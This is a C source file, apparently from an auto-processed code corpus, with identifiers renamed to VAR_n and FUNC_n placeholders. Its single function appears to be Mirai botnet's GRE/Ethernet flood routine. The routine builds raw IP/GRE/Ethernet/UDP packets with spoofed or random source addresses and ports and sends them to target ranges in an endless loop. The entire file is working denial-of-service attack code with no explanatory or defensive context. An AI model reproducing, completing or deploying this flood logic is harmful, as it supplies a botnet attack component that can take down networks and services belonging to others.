
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; int daddr; void* check; int protocol; void* frag_off; void* tot_len; } ;
struct grehdr {void* protocol; } ;
struct ethhdr {scalar_t__ h_source; scalar_t__ h_dest; void* h_proto; } ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {scalar_t__ sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct attack_target {int addr; int netmask; TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 int VAR_22 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 void* FUNC_1 (int,int) ;
 void* FUNC_2 (int*,int) ;
 scalar_t__ FUNC_3 (struct iphdr*,struct udphdr*,void*,int) ;
 int FUNC_4 (int) ;
 scalar_t__ VAR_23 ;
 int FUNC_5 (scalar_t__) ;
 void* FUNC_6 (int) ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 () ;
 int FUNC_10 (char*,int) ;
 int FUNC_11 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_12 (int,int ,int ,int*,int) ;
 int FUNC_13 (int ,int ,int ) ;
 int FUNC_14 (scalar_t__,char*,int) ;

void FUNC_15(uint8_t VAR_24, struct attack_target *VAR_25, uint8_t VAR_26, struct attack_option *VAR_27)
{
    int VAR_28, VAR_29;
    char **VAR_30 = FUNC_1(VAR_24, sizeof (char *));
    uint8_t VAR_31 = FUNC_0(VAR_26, VAR_27, VAR_5, 0);
    uint16_t VAR_32 = FUNC_0(VAR_26, VAR_27, VAR_4, 0xffff);
    uint8_t VAR_33 = FUNC_0(VAR_26, VAR_27, VAR_6, 64);
    BOOL VAR_34 = FUNC_0(VAR_26, VAR_27, VAR_3, VAR_22);
    port_t VAR_35 = FUNC_0(VAR_26, VAR_27, VAR_10, 0xffff);
    port_t VAR_36 = FUNC_0(VAR_26, VAR_27, VAR_1, 0xffff);
    int VAR_37 = FUNC_0(VAR_26, VAR_27, VAR_8, 512);
    BOOL VAR_38 = FUNC_0(VAR_26, VAR_27, VAR_7, VAR_22);
    BOOL VAR_39 = FUNC_0(VAR_26, VAR_27, VAR_2, VAR_12);
    uint32_t VAR_40 = FUNC_0(VAR_26, VAR_27, VAR_9, VAR_18);

    if ((VAR_29 = FUNC_13(VAR_0, VAR_21, VAR_15)) == -1)
    {



        return;
    }
    VAR_28 = 1;
    if (FUNC_12(VAR_29, VAR_14, VAR_17, &VAR_28, sizeof (int)) == -1)
    {



        FUNC_4(VAR_29);
        return;
    }

    for (VAR_28 = 0; VAR_28 < VAR_24; VAR_28++)
    {
        struct iphdr *VAR_41;
        struct grehdr *VAR_42;
        struct ethhdr *VAR_43;
        struct iphdr *VAR_44;
        struct udphdr *VAR_45;
        uint32_t VAR_46, VAR_47, VAR_48;

        VAR_30[VAR_28] = FUNC_1(1510, sizeof (char *));
        VAR_41 = (struct iphdr *)(VAR_30[VAR_28]);
        VAR_42 = (struct grehdr *)(VAR_41 + 1);
        VAR_43 = (struct ethhdr *)(VAR_42 + 1);
        VAR_44 = (struct iphdr *)(VAR_43 + 1);
        VAR_45 = (struct udphdr *)(VAR_44 + 1);


        VAR_41->version = 4;
        VAR_41->ihl = 5;
        VAR_41->tos = VAR_31;
        VAR_41->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_37);
        VAR_41->id = FUNC_6(VAR_32);
        VAR_41->ttl = VAR_33;
        if (VAR_34)
            VAR_41->frag_off = FUNC_6(1 << 14);
        VAR_41->protocol = VAR_13;
        VAR_41->saddr = VAR_40;
        VAR_41->daddr = VAR_25[VAR_28].addr;


        VAR_42->protocol = FUNC_6(VAR_20);


        VAR_43->h_proto = FUNC_6(VAR_11);


        VAR_44->version = 4;
        VAR_44->ihl = 5;
        VAR_44->tos = VAR_31;
        VAR_44->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_37);
        VAR_44->id = FUNC_6(~VAR_32);
        VAR_44->ttl = VAR_33;
        if (VAR_34)
            VAR_44->frag_off = FUNC_6(1 << 14);
        VAR_44->protocol = VAR_16;
        VAR_44->saddr = FUNC_9();
        if (VAR_39)
            VAR_44->daddr = VAR_41->daddr;
        else
            VAR_44->daddr = ~(VAR_44->saddr - 1024);


        VAR_45->source = FUNC_6(VAR_35);
        VAR_45->dest = FUNC_6(VAR_36);
        VAR_45->len = FUNC_6(sizeof (struct udphdr) + VAR_37);
    }

    while (VAR_22)
    {
        for (VAR_28 = 0; VAR_28 < VAR_24; VAR_28++)
        {
            char *VAR_49 = VAR_30[VAR_28];
            struct iphdr *VAR_50 = (struct iphdr *)VAR_49;
            struct grehdr *VAR_51 = (struct grehdr *)(VAR_50 + 1);
            struct ethhdr *VAR_52 = (struct ethhdr *)(VAR_51 + 1);
            struct iphdr *VAR_53 = (struct iphdr *)(VAR_52 + 1);
            struct udphdr *VAR_54 = (struct udphdr *)(VAR_53 + 1);
            char *VAR_55 = (char *)(VAR_54 + 1);
            uint32_t VAR_56, VAR_57, VAR_58;


            if (VAR_25[VAR_28].netmask < 32)
                VAR_50->daddr = FUNC_5(FUNC_7(VAR_25[VAR_28].addr) + (((uint32_t)FUNC_9()) >> VAR_25[VAR_28].netmask));

            if (VAR_40 == 0xffffffff)
                VAR_50->saddr = FUNC_9();

            if (VAR_32 == 0xffff)
            {
                VAR_50->id = FUNC_9() & 0xffff;
                VAR_53->id = ~(VAR_50->id - 1000);
            }
            if (VAR_35 == 0xffff)
                VAR_54->source = FUNC_9() & 0xffff;
            if (VAR_36 == 0xffff)
                VAR_54->dest = FUNC_9() & 0xffff;

            if (!VAR_39)
                VAR_53->daddr = FUNC_9();
            else
                VAR_53->daddr = VAR_50->daddr;

            VAR_56 = FUNC_9();
            VAR_57 = FUNC_9();
            VAR_58 = FUNC_9();
            FUNC_14(VAR_52->h_dest, (char *)&VAR_56, 4);
            FUNC_14(VAR_52->h_source, (char *)&VAR_57, 4);
            FUNC_14(VAR_52->h_dest + 4, (char *)&VAR_58, 2);
            FUNC_14(VAR_52->h_source + 4, (((char *)&VAR_58)) + 2, 2);

            if (VAR_38)
                FUNC_10(VAR_55, VAR_37);

            VAR_50->check = 0;
            VAR_50->check = FUNC_2((uint16_t *)VAR_50, sizeof (struct iphdr));

            VAR_53->check = 0;
            VAR_53->check = FUNC_2((uint16_t *)VAR_53, sizeof (struct iphdr));

            VAR_54->check = 0;
            VAR_54->check = FUNC_3(VAR_53, VAR_54, VAR_54->len, sizeof (struct udphdr) + VAR_37);

            VAR_25[VAR_28].sock_addr.sin_family = VAR_0;
            VAR_25[VAR_28].sock_addr.sin_addr.s_addr = VAR_50->daddr;
            VAR_25[VAR_28].sock_addr.sin_port = 0;
            FUNC_11(VAR_29, VAR_49, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + VAR_37, VAR_19, (struct sockaddr *)&VAR_25[VAR_28].sock_addr, sizeof (struct sockaddr_in));
        }






    }
}
